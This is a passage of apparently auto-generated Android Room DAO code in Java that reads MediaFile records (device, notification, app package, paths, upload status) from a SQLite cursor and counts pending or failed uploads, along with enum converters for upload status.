            final String _tmpId;
            if (_cursor.isNull(_cursorIndexOfId)) {
              _tmpId = null;
            } else {
              _tmpId = _cursor.getString(_cursorIndexOfId);
            }
            final String _tmpDeviceId;
            if (_cursor.isNull(_cursorIndexOfDeviceId)) {
              _tmpDeviceId = null;
            } else {
              _tmpDeviceId = _cursor.getString(_cursorIndexOfDeviceId);
            }
            final String _tmpNotificationId;
            if (_cursor.isNull(_cursorIndexOfNotificationId)) {
              _tmpNotificationId = null;
            } else {
              _tmpNotificationId = _cursor.getString(_cursorIndexOfNotificationId);
            }
            final String _tmpAppPackage;
            if (_cursor.isNull(_cursorIndexOfAppPackage)) {
              _tmpAppPackage = null;
            } else {
              _tmpAppPackage = _cursor.getString(_cursorIndexOfAppPackage);
            }
            final String _tmpLocalPath;
            if (_cursor.isNull(_cursorIndexOfLocalPath)) {
              _tmpLocalPath = null;
            } else {
              _tmpLocalPath = _cursor.getString(_cursorIndexOfLocalPath);
            }
            final String _tmpRemoteUrl;
            if (_cursor.isNull(_cursorIndexOfRemoteUrl)) {
              _tmpRemoteUrl = null;
            } else {
              _tmpRemoteUrl = _cursor.getString(_cursorIndexOfRemoteUrl);
            }
            final long _tmpFileSize;
            _tmpFileSize = _cursor.getLong(_cursorIndexOfFileSize);
            final String _tmpMimeType;
            if (_cursor.isNull(_cursorIndexOfMimeType)) {
              _tmpMimeType = null;
            } else {
              _tmpMimeType = _cursor.getString(_cursorIndexOfMimeType);
            }
            final String _tmpChecksum;
            if (_cursor.isNull(_cursorIndexOfChecksum)) {
              _tmpChecksum = null;
            } else {
              _tmpChecksum = _cursor.getString(_cursorIndexOfChecksum);
            }
            final UploadStatus _tmpUploadStatus;
            _tmpUploadStatus = __UploadStatus_stringToEnum(_cursor.getString(_cursorIndexOfUploadStatus));
            final int _tmpUploadAttempts;
            _tmpUploadAttempts = _cursor.getInt(_cursorIndexOfUploadAttempts);
            final Long _tmpLastUploadAttempt;
            if (_cursor.isNull(_cursorIndexOfLastUploadAttempt)) {
              _tmpLastUploadAttempt = null;
            } else {
              _tmpLastUploadAttempt = _cursor.getLong(_cursorIndexOfLastUploadAttempt);
            }
            final String _tmpErrorMessage;
            if (_cursor.isNull(_cursorIndexOfErrorMessage)) {
              _tmpErrorMessage = null;
            } else {
              _tmpErrorMessage = _cursor.getString(_cursorIndexOfErrorMessage);
            }
            final long _tmpCreatedAt;
            _tmpCreatedAt = _cursor.getLong(_cursorIndexOfCreatedAt);
            _item = new MediaFile(_tmpId,_tmpDeviceId,_tmpNotificationId,_tmpAppPackage,_tmpLocalPath,_tmpRemoteUrl,_tmpFileSize,_tmpMimeType,_tmpChecksum,_tmpUploadStatus,_tmpUploadAttempts,_tmpLastUploadAttempt,_tmpErrorMessage,_tmpCreatedAt);
            _result.add(_item);
          }
          return _result;
        } finally {
          _cursor.close();
          _statement.release();
        }
      }
    }, $completion);
  }

  @Override
  public Object getPendingUploadCount(final Continuation<? super Integer> $completion) {
    final String _sql = "SELECT COUNT(*) FROM media_files WHERE uploadStatus IN ('PENDING', 'FAILED')";
    final RoomSQLiteQuery _statement = RoomSQLiteQuery.acquire(_sql, 0);
    final CancellationSignal _cancellationSignal = DBUtil.createCancellationSignal();
    return CoroutinesRoom.execute(__db, false, _cancellationSignal, new Callable<Integer>() {
      @Override
      @NonNull
      public Integer call() throws Exception {
        final Cursor _cursor = DBUtil.query(__db, _statement, false, null);
        try {
          final Integer _result;
          if (_cursor.moveToFirst()) {
            final Integer _tmp;
            if (_cursor.isNull(0)) {
              _tmp = null;
            } else {
              _tmp = _cursor.getInt(0);
            }
            _result = _tmp;
          } else {
            _result = null;
          }
          return _result;
        } finally {
          _cursor.close();
          _statement.release();
        }
      }
    }, $completion);
  }

  @NonNull
  public static List<Class<?>> getRequiredConverters() {
    return Collections.emptyList();
  }

  private String __UploadStatus_enumToString(@NonNull final UploadStatus _value) {
    switch (_value) {
      case PENDING: return "PENDING";
      case UPLOADING: return "UPLOADING";
      case SUCCESS: return "SUCCESS";
      case FAILED: return "FAILED";
      case PERMANENTLY_FAILED: return "PERMANENTLY_FAILED";
      default: throw new IllegalArgumentException("Can't convert enum to string, unknown enum value: " + _value);
    }
  }

  private UploadStatus __UploadStatus_stringToEnum(@NonNull final String _value) {
    switch (_value) {
      case "PENDING": return UploadStatus.PENDING;
      case "UPLOADING": return UploadStatus.UPLOADING;
      case "SUCCESS": return UploadStatus.SUCCESS;
      case "FAILED": return UploadStatus.FAILED;
      case "PERMANENTLY_FAILED": return UploadStatus.PERMANENTLY_FAILED;
      default: throw new IllegalArgumentException("Can't convert value to enum, unknown value: " + _value);
    }
  }
}
